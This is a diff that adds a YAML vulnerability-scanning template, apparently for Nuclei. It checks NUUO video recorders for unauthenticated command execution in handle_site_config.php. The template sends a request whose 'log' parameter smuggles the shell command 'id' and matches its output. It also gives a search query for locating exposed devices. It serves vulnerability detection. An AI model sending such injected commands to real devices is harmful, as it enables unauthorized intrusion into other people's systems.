@@ -1,0 +1,30 @@
+id: nuuo-handle_site_config-rce
+info:
+  name: NUUO 摄像机 handle_site_config - rce
+  author: leadlife
+  severity: critical
+  description: NUUO摄像头是中国台湾NUUO公司旗下的一款网络视频记录器，NUUO摄像头handle_site_config.php存在未授权命令执行漏洞，攻击者可以获取服务器权限
+  reference: 
+    - https://github.com/wy876/POC/blob/main/NUUO/NUUO%E6%91%84%E5%83%8F%E6%9C%BAhandle_site_config%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="www.nuuo.com/eHelpdesk.php"
+  tags: nuuo,rce,iot,nvr
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/handle_site_config.php?log=;id;"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: status
+        status:
+          - 200
